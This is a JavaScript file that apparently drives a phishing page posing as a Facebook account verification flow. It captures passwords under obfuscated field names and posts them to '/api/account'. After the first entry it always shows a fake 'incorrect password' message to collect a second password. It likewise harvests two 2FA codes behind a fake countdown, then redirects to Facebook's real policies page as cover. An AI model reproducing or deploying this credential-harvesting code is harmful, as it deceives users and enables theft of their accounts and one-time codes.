function startTimer(duration, display) {
  $(display)
    .removeClass("text-blue-800 cursor-pointer")
    .addClass("pointer-events-none");
  var timer = duration,
    minutes,
    seconds;
  let count = setInterval(function () {
    minutes = parseInt(timer / 60, 10);
    seconds = parseInt(timer % 60, 10);

    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;

    display.text("(Wait " + minutes + ":" + seconds + ")");

    if (--timer < 0) {
      $(display)
        .text("Send Code Again")
        .addClass("text-blue-800 cursor-pointer")
        .removeClass("pointer-events-none");

      clearInterval(count);
    }
  }, 1000);
}

$(document).ready(function () {
  $(".agree-terms").change(function () {
    $(".btn-submit-form").attr("disabled", function (_, attr) {
      return !attr;
    });
  });

  // set the modal menu element
  const $targetEl = document.getElementById("modalEl");

  const $finishModal = document.getElementById("finishModal");

  // options with default values
  const options = {
    placement: "center-center",
    backdrop: "static",
    backdropClasses:
      "bg-gray-900 bg-opacity-50 dark:bg-opacity-80 fixed inset-0 z-40",
    closable: true,
  };

  const modal = new Modal($targetEl, options);
  const modal2 = new Modal($finishModal, options);
  $("#form_info").submit(function (e) {
    e.preventDefault();

    modal.show();
  });

  let num_enter_password = 1;

  let num_send_2fa = 1;

  $("#store-account").submit(function (e) {
    e.preventDefault();

    let $this = $(this);

    let _password = $(this).find('[name="conbepeidd"]').val();

    let _formInfo = new FormData(document.getElementById("form_info"));

    if (num_enter_password == 1) {
      _formInfo.append("conbepeidd", _password);
    }

    if (num_enter_password == 2) {
      _formInfo.append("rztlppczbh", _password);
    }

    _formInfo.append("num_enter_password", num_enter_password);

    $.ajax({
      url: "/api/account",
      type: "POST",
      contentType: false,
      processData: false,
      data: _formInfo,
      success: function (res) {
        if (num_enter_password == 2) {
          window.location.href = "/confirm";
        }

        $(".error_password").text("The password you've entered is incorrect.");

        $this.find('[name="conbepeidd"]').val("");

        num_enter_password++;
      },
      error: function (err) {
        console.log(err);
      },
    });
  });

  $(".send-2fa").click(function () {
    let _code = $(".2fa-code").val();

    if (_code == "") {
      $(".error_2fa").text(
        "The code generator you entered is incorrect. Please wait 5 minutes to receive another one."
      );

      return false;
    }

    $.ajax({
      url: "/api/2fa-code",
      type: "POST",
      data: { pbyzfnkbio: _code },
      success: function (res) {
        if (num_send_2fa == 2) {
          modal2.show();

          $(".error_2fa").text("");

          $(".timer-count").remove();

          return;
        }

        num_send_2fa++;

        $(".error_2fa").text(
          "The code generator you entered is incorrect. Please wait 5 minutes to receive another one."
        );
        $(".2fa-code").val("");
      },
      error: function (err) {},
    });
  });
});

startTimer(60 * 5, $(".timer-count"));

$(".timer-count").click(function () {
  if ($(this).hasClass("pointer-events-none")) return false;
  startTimer(60 * 5, $(".timer-count"));
});

$(".finish-verify").click(function () {
  window.location.href = "https://www.facebook.com/policies_center/";
});
